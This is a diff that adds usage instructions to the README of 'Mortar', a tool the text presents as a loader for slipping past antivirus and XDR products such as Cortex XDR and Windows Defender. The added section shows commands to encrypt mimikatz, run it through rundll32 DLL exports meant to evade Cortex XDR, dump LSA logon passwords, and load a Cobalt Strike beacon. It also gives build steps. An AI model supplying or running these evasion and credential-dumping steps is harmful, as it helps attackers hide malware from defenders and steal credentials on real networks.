@@ -10,6 +10,42 @@ Mortar is able to bypass modern anti-virus products and advanced XDR solutions a
 * Cortex XDR 
 * Windows defender 
 * Cylance
+# Usage 
+
+## Encryptor 
+
+```
+root@kali>./encryptor -f mimikatz.exe -o bin.tmp 
+
+```
+
+## Loader (DLL)
+for bypassing Cortex XDR,add agressor.dll with bin.tmp in the same folder and script the following bat file 
+```
+@echo off 
+cmd.exe /c rundll32.exe agressor.dll,stealth
+```
+for normal usage you can directly execute the agressor.dll 
+
+```
+rundll32.exe agressor.dll,dec
+```
+## Loader (EXE)
+the executable version has more options you can use, as you able to pass commands for the loaded binary
+
+```
+##Mimikatz dump LSA 
+deliver.exe -d -c sekurlasa::logonpasswords -f mimikatz.enc 
+
+## Cobalt strike beacon 
+deliver.exe -d -f cobalt.enc 
+
+```
+# Compiling 
+the project has been coded using FPC(Free Pascal), the compiling procedures are straightforward by downloading and installing Lazarus IDE (https://www.lazarus-ide.org/index.php?page=downloads) and navigate into file > open  -> Run -> build 
+
+
+
 
 
 
